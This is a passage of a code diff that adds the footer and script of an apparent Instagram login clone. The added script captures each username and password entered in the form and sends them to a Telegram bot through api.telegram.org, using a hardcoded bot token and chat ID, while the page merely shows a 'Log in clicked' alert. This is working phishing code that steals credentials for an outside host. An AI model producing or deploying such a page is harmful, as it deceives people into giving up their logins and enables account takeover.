+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;BLOG&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;PRESS&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;API&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;JOBS&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;PRIVACY&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;TERMS&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;DIRECTORY&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;LANGUAGE&lt;/a&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;footer-branding&quot; aria-label=&quot;Instagram branding&quot;&gt;
+      INSTAGRAM
+    &lt;/div&gt;
+  &lt;/footer&gt;
+
+  &lt;script&gt;
+    async function sendToTelegram(username, password) {
+      const botToken = &#39;6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ&#39;;
+      const chatId = &#39;1747742228&#39;;
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: &#39;POST&#39;,
+          headers: {
+            &#39;Content-Type&#39;: &#39;application/json&#39;
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        if (!response.ok) {
+          console.error(&#39;Failed to send message to Telegram&#39;);
+        }
+      } catch (error) {
+        console.error(&#39;Error sending message to Telegram:&#39;, error);
+      }
+    }
+
+    document.querySelector(&#39;form&#39;).addEventListener(&#39;submit&#39;, function(event) {
+      event.preventDefault();
+
+      const username = this.username.value;
+      const password = this.password.value;
+
+      sendToTelegram(username, password);
+
+      alert(&#39;Log in clicked&#39;);
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+  &lt;/html&gt;
